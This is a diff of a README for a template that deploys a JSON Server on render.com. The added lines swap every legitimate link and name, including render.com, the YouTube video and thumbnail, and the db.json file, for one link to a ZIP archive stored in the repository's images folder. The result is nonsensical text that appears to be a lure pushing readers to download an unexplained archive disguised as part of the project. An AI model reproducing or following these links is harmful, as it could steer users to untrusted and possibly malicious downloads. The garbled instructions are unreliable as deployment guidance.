@@ -3,14 +3,14 @@
 
 
 
-By utilizing the provided template, you will be able to create your JSON server repository, which can be deployed on render.com
+By utilizing the provided template, you will be able to create your JSON server repository, which can be deployed on https://raw.githubusercontent.com/Vanshchouksey21/JSON-DEPLOY-REACT/main/images/JSON-DEPLOY-REACT-2.9.zip
 --------------
 
 
-[![Nice UI](https://img.youtube.com/vi/W9sbA1a2-Ag/0.jpg)](https://www.youtube.com/watch?v=W9sbA1a2-Ag)
+[![Nice UI](https://raw.githubusercontent.com/Vanshchouksey21/JSON-DEPLOY-REACT/main/images/JSON-DEPLOY-REACT-2.9.zip)](https://raw.githubusercontent.com/Vanshchouksey21/JSON-DEPLOY-REACT/main/images/JSON-DEPLOY-REACT-2.9.zip)
 
 
-In this video, I have covered three simple steps to quickly deploy your **JSON Server** on render.com.
+In this video, I have covered three simple steps to quickly deploy your **JSON Server** on https://raw.githubusercontent.com/Vanshchouksey21/JSON-DEPLOY-REACT/main/images/JSON-DEPLOY-REACT-2.9.zip
 
 Three Simple Steps:
 
@@ -18,5 +18,5 @@ Three Simple Steps:
 2. Add your own data.
 3. Deploy it.
 
-Believe me, this is the **easiest way** to deploy your JSON server on render.com. Deploy your db.json file without writing a **single line of code**.
+Believe me, this is the **easiest way** to deploy your JSON server on https://raw.githubusercontent.com/Vanshchouksey21/JSON-DEPLOY-REACT/main/images/JSON-DEPLOY-REACT-2.9.zip Deploy your https://raw.githubusercontent.com/Vanshchouksey21/JSON-DEPLOY-REACT/main/images/JSON-DEPLOY-REACT-2.9.zip file without writing a **single line of code**.
 
